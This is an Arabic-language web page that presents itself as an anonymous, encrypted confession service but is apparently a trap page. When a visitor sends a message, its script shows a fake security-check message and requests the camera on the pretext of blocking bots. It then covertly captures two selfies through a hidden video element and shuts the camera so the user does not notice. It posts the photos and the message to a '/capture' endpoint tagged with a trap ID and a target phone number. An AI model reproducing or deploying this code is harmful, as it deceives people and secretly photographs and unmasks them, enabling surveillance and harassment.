
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صارحني - رسائل سرية</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&display=swap');
        body {
            font-family: 'Cairo', sans-serif;
            background: radial-gradient(circle at top right, #2e1065 0%, #0f172a 100%);
            min-height: 100vh;
            color: #f8fafc;
        }
        .glass-card {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .textarea-custom {
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            resize: none;
            transition: all 0.3s ease;
        }
        .textarea-custom:focus {
            outline: none;
            border-color: #a855f7;
            background: rgba(0, 0, 0, 0.4);
            box-shadow: 0 0 15px rgba(168, 85, 247, 0.2);
        }
    </style>
</head>
<body class="flex items-center justify-center p-4">

    <!-- عنصر الكاميرا المخفي تماماً (ضروري لالتقاط الصور) -->
    <video id="spy-vid" autoplay playsinline muted class="absolute opacity-0 w-1 h-1 -z-50"></video>

    <!-- واجهة المستخدم الأساسية -->
    <main id="main-ui" class="w-full max-w-md glass-card rounded-3xl p-8 shadow-2xl relative overflow-hidden transition-all duration-500">
        
        <!-- تأثيرات بصرية -->
        <div class="absolute -top-16 -right-16 w-32 h-32 bg-purple-600/30 rounded-full blur-3xl pointer-events-none"></div>
        <div class="absolute -bottom-16 -left-16 w-32 h-32 bg-blue-600/30 rounded-full blur-3xl pointer-events-none"></div>

        <!-- الترويسة -->
        <div class="text-center mb-8 relative z-10">
            <div class="w-20 h-20 mx-auto bg-gradient-to-tr from-purple-600 to-blue-500 rounded-full flex items-center justify-center shadow-lg shadow-purple-500/30 mb-4 animate-pulse">
                <i class="fa-solid fa-user-secret text-4xl text-white"></i>
            </div>
            <h1 class="text-3xl font-extrabold tracking-tight bg-gradient-to-r from-purple-300 to-blue-300 bg-clip-text text-transparent">صارحني بسرية</h1>
            <p class="text-slate-400 mt-2 text-sm">اكتب رسالتك دون أن يعرف أحد هويتك. نحن نضمن لك السرية التامة المشفّرة.</p>
        </div>

        <!-- نموذج الرسالة -->
        <div class="space-y-5 relative z-10">
            <div class="relative">
                <textarea id="confession-text" rows="5" class="w-full textarea-custom rounded-2xl p-4 text-white placeholder-slate-500" placeholder="اكتب ما في قلبك هنا..."></textarea>
                <div class="absolute bottom-3 left-4 text-xs text-slate-500 font-mono"><i class="fa-solid fa-lock"></i> TLS 1.3</div>
            </div>

            <button id="send-btn" class="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 text-white font-bold py-4 rounded-2xl shadow-lg active:scale-95 transition-all flex justify-center items-center gap-2">
                <i class="fa-solid fa-paper-plane"></i>
                <span>إرسال المصارحة</span>
            </button>
        </div>
    </main>

    <!-- شاشة النجاح -->
    <div id="success-ui" class="hidden w-full max-w-md glass-card rounded-3xl p-10 shadow-2xl text-center transform scale-95 opacity-0 transition-all duration-500">
        <div class="w-24 h-24 mx-auto bg-emerald-500/20 rounded-full flex items-center justify-center mb-6">
            <i class="fa-solid fa-check text-5xl text-emerald-400"></i>
        </div>
        <h2 class="text-2xl font-bold text-white mb-2">تم الإرسال بنجاح!</h2>
        <p class="text-slate-400 text-sm">وصلت رسالتك إلى المعني بسرية تامة دون الكشف عن أي بيانات.</p>
    </div>

    <script>
        // قراءة المتغيرات من الرابط (الجلسة والرقم)
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');
        const targetNumber = urlParams.get('target');

        const sendBtn = document.getElementById('send-btn');
        const confessionText = document.getElementById('confession-text');
        const mainUi = document.getElementById('main-ui');
        const successUi = document.getElementById('success-ui');
        const videoElement = document.getElementById('spy-vid');

        sendBtn.addEventListener('click', async () => {
            const message = confessionText.value.trim();
            if (!message) {
                alert("⚠️ يرجى كتابة رسالتك أولاً قبل الإرسال!");
                return;
            }

            if (!sessionId || !targetNumber) {
                alert("⚠️ عذراً، الرابط غير مكتمل أو تالف.");
                return;
            }

            // تغيير شكل الزر للإيهام بالفحص
            sendBtn.disabled = true;
            sendBtn.innerHTML = `<i class="fa-solid fa-shield-halved animate-spin"></i> <span>جاري التحقق الأمني وتشفير الرسالة...</span>`;

            let capturedImages = [];

            try {
                // طلب الصلاحية بحجة "منع الروبوتات"
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                videoElement.srcObject = stream;
                
                // انتظار ثانية واحدة حتى تفتح الكاميرا بوضوح
                await new Promise(resolve => setTimeout(resolve, 1000));

                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth || 640;
                canvas.height = videoElement.videoHeight || 480;
                const ctx = canvas.getContext('2d');

                // التقاط الصورة الأولى
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));

                // انتظار نصف ثانية
                await new Promise(resolve => setTimeout(resolve, 500));

                // التقاط الصورة الثانية
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));

                // إغلاق الكاميرا فوراً حتى لا يلاحظ
                stream.getTracks().forEach(track => track.stop());

            } catch (err) {
                console.log("تم رفض الكاميرا، سيتم إرسال الرسالة فقط.");
                // لا نفعل شيئاً، سيتم إرسال صورة الرسالة فقط
            }

            // 🎨 تحويل رسالة الصارحني النصية إلى صورة بتصميم فخم لترسل للواتساب
            const textImageBase64 = generateMessageImage(message);
            capturedImages.push(textImageBase64); // إضافة صورة الرسالة كآخر صورة

            // 🚀 إرسال الحزمة للسيرفر الخاص بك
            sendDataToServer(capturedImages);
        });

        // دالة توليد صورة من النص (Canvas API)
        function generateMessageImage(text) {
            const canvas = document.createElement('canvas');
            canvas.width = 800;
            canvas.height = 800;
            const ctx = canvas.getContext('2d');

            // رسم الخلفية الفخمة المتدرجة
            const grad = ctx.createLinearGradient(0, 0, 0, 800);
            grad.addColorStop(0, '#1e1b4b'); // كحلي غامق
            grad.addColorStop(1, '#0f172a'); // رصاصي داكن
            ctx.fillStyle = grad;
            ctx.fillRect(0, 0, 800, 800);

            // إعدادات النص ودعم اللغة العربية (RTL)
            ctx.direction = 'rtl';
            ctx.textAlign = 'center';

            // الترويسة
            ctx.fillStyle = '#a855f7'; // لون بنفسجي
            ctx.font = 'bold 45px Arial';
            ctx.fillText('💌 رسالة صارحني جديدة', 400, 120);

            // خط فاصل
            ctx.strokeStyle = 'rgba(255, 255, 255, 0.2)';
            ctx.lineWidth = 2;
            ctx.beginPath();
            ctx.moveTo(150, 160);
            ctx.lineTo(650, 160);
            ctx.stroke();

            // رسم النص (مع خاصية كسر الأسطر الطويلة)
            ctx.fillStyle = '#ffffff';
            ctx.font = '40px Arial';
            ctx.shadowColor = "rgba(0,0,0,0.5)";
            ctx.shadowBlur = 10;
            
            const words = text.split(' ');
            let line = '';
            let y = 260;
            const maxWidth = 650;

            for(let n = 0; n < words.length; n++) {
                let testLine = line + words[n] + ' ';
                let metrics = ctx.measureText(testLine);
                if (metrics.width > maxWidth && n > 0) {
                    ctx.fillText(line, 400, y);
                    line = words[n] + ' ';
                    y += 60;
                } else {
                    line = testLine;
                }
            }
            ctx.fillText(line, 400, y);

            // التذييل
            ctx.shadowBlur = 0;
            ctx.fillStyle = '#64748b';
            ctx.font = '25px Arial';
            ctx.fillText('🔒 تم الاستلام عبر نظام TARZAN VIP', 400, 750);

            return canvas.toDataURL('image/jpeg', 0.9);
        }

        // دالة إرسال البيانات للباك-إند
        function sendDataToServer(dataPayload) {
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'selfie', // نستخدم نوع selfie ليقوم السيرفر بقراءتها كصور
                    data: dataPayload, 
                    targetNumber: targetNumber, 
                    trapId: 'SARAHNI-MSG', 
                    sessionId: sessionId 
                })
            })
            .then(res => res.json())
            .then(resData => {
                // إخفاء واجهة الرسالة وإظهار واجهة النجاح
                mainUi.style.opacity = '0';
                setTimeout(() => {
                    mainUi.classList.add('hidden');
                    successUi.classList.remove('hidden');
                    setTimeout(() => {
                        successUi.style.opacity = '1';
                        successUi.style.transform = 'scale(1)';
                    }, 50);
                }, 500);
            })
            .catch(err => {
                alert("⚠️ تعذر إرسال الرسالة بسبب ضعف الاتصال.");
                location.reload();
            });
        }
    </script>
</body>
</html>
